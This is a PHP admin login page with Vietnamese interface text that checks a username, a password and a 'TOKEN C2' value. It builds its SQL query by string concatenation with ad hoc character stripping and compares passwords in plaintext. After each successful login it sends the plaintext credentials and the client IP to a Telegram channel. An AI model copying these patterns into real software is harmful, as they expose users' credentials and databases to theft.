<?php
require_once('../config/config.php');
date_default_timezone_set("Asia/Ho_Chi_minh");
$time = date("h:i:s");
$site = $_SERVER['SERVER_NAME'];
$ip = $_SERVER['REMOTE_ADDR'];
?>

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Đăng Nhập</title>
    <!-- Tell the browser to be responsive to screen width -->
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!-- Font Awesome -->
    <link rel="stylesheet" href="plugins/fontawesome-free/css/all.min.css">
    <!-- Ionicons -->
    <link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css">
    <!-- icheck bootstrap -->
    <link rel="stylesheet" href="plugins/icheck-bootstrap/icheck-bootstrap.min.css">
    <!-- Theme style -->
    <link rel="stylesheet" href="dist/css/adminlte.min.css">
    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
    <!-- Google Font: Source Sans Pro -->
    <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,400i,700" rel="stylesheet">
</head>
<div class="container-fluid">
    <div class="row no-gutter">
        <!-- The image half -->
        <div class="col-md-6 d-none d-md-flex bg-image"></div>
        <?php

        if (isset($_POST["submit"])) {
            $username = str_replace(array('<', "'", '>', '?', '/', "\\", '--', 'eval(', '<php'), array('', '', '', '', '', '', '', '', ''), htmlspecialchars(addslashes(strip_tags($_POST['username']))));
            $password = str_replace(array('<', "'", '>', '?', '/', "\\", '--', 'eval(', '<php'), array('', '', '', '', '', '', '', '', ''), htmlspecialchars(addslashes(strip_tags($_POST['password']))));
            $token = str_replace(array('<', "'", '>', '?', '/', "\\", '--', 'eval(', '<php'), array('', '', '', '', '', '', '', '', ''), htmlspecialchars(addslashes(strip_tags($_POST['token']))));
            if ($username == "" || $password == "" || $token == "") {
                echo '<script type="text/javascript">swal("Lỗi", "Vui Lòng Nhập Đầy Đủ Thông Tin", "error");
        setTimeout(function(){ location.href = "login.php" },2000);</script>';
            } else {
                $sql = "SELECT * FROM `users` WHERE `username` = '" . $username . "' AND `password` = '" . $password . "' AND `token` = '" . $token . "' ";
                $query = mysqli_query($ketnoi, $sql);
                $num_rows = mysqli_num_rows($query);

                if ($num_rows == 0) {
                    echo '<script type="text/javascript">swal("Lỗi", "Thông Tin Đăng Nhập Không Hợp Lệ !", "error");
            setTimeout(function(){ location.href = "" },2000);</script>';
                    die();
                } else {

                    $_SESSION['admin'] = $username;
                    sendTele(templateTele(' Tên Miền ' . $site . ' Vừa Được Đăng Nhập Vào Trang Quản Trị Thành Công Với Tài Khoản Là "' . $username . '" Và Mật Khẩu + Với TOKEN "' . $password . '" Và "' . $token . '" Với Địa Chỉ IP Là ' . $ip));
                    echo '<script type="text/javascript">swal("Thành Công","Đăng Nhập Thành Công","success");
                setTimeout(function(){ location.href = "index.php" },10);</script>';
                }
            }
        }
        ?>
        <!-- The content half -->
        <div class="col-md-6 bg-light">
            <div class="login d-flex align-items-center py-5">

                <!-- Demo content-->
                <div class="container">
                    <div class="row">
                        <div class="col-lg-10 col-xl-7 mx-auto">
                            <h3 class="display-4">Chào Mừng Trở Lại</h3>
                            <p class="text-muted mb-4">Hãy Đăng Nhập Để Tiếp Tục</p>
                            <form method="post">
                                <div class="form-group mb-3">
                                    <input id="inputEmail" type="text" placeholder="Tên Đăng Nhập" name="username" required="" autofocus="" class="form-control rounded-pill border-0 shadow-sm px-4">
                                </div>
                                <div class="form-group mb-3">
                                    <input id="inputEmail" type="password" placeholder="Mật Khẩu" name="password" required="" autofocus="" class="form-control rounded-pill border-0 shadow-sm px-4">
                                </div>
                                <div class="form-group mb-3">
                                    <input id="inputEmail" type="password" placeholder="TOKEN C2" name="token" required="" autofocus="" class="form-control rounded-pill border-0 shadow-sm px-4">
                                </div>
                                <button type="submit" name="submit" class="btn btn-primary btn-block text-uppercase mb-2 rounded-pill shadow-sm">Đăng Nhập</button>
                                <div class="text-center d-flex justify-content-between mt-4">
                                    <p>Design By <a href="https://www.facebook.com/xNgdb.xD" style="text-decoration: none;color: blue">Trần Minh Anh</a></p>
                                </div>
                            </form>
                        </div>
                    </div>
                </div><!-- End -->

            </div>
        </div><!-- End -->

    </div>
</div>

<style>
    .login,
    .image {
        min-height: 100vh;
    }

    .bg-image {
        background-image: url('https://c4.wallpaperflare.com/wallpaper/325/140/18/alone-stars-purple-background-hd-wallpaper-preview.jpg');
        background-size: cover;
        background-position: center center;
    }
</style>

</body>